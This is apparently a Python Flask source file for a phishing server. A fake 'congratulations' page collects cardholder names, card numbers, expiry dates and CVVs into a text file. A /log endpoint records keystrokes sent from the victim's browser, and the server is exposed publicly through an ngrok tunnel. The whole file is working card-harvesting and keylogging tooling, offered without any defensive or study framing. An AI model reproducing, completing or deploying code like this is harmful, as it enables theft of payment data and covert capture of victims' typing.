from flask import Flask, render_template, request, redirect, url_for
from pyngrok import ngrok  # Requires pyngrok library
import os

app = Flask(__name__)

@app.route('/')
def index():
    # Serve the main congratulations page
    return render_template('Qaseh.html')

# Define the path to save the billing data
SAVE_PATH = 'billing_data.txt'

@app.route('billing', methods=['POST'])
def process_billing():
    # Handle the form submission (saving data, etc.)
    cardholder = request.form.get('cardholder')
    cardNum = request.form.get('cardNum')
    cardexpiry = request.form.get('cardexpiry')
    cvv = request.form.get('cvv')

    # Example: Saving data to a file
    billing_data = f"Cardholder: {cardholder}\nCard Number: {cardNum}\nCard Expiry: {cardexpiry}\nCVV: {cvv}\n\n"
    with open('billing_data.txt', 'a') as file:
        file.write(billing_data)

    # Redirect to 'alhamdulillah' page
    return redirect(url_for('alhamduliah'))

@app.route('/alhamduliah')
def alhamduliah():
    # Serve the thank you "alhamdulillah" page
    return render_template('alhamduliah.html')

@app.route('/log', methods=['POST'])
def log_key():
    # Log the captured key to the console
    data = request.get_json()
    if data and 'key' in data:
        key = data['key']
        # Log the key press into a file
        with open('keystrokes.txt', 'a') as file:
            file.write(f"{key}\n")
        print(f"Key pressed: {data['key']}")
    return '', 204

if __name__ == '__main__':
    # Start Flask server in a background thread
    port = 8080
    print("Starting Flask server...")
    public_url = ngrok.connect(port)  # Expose the server to the internet
    print(f"Public URL: {public_url}")
    
    # Run the Flask app
    app.run(host='0.0.0.0', port=port)
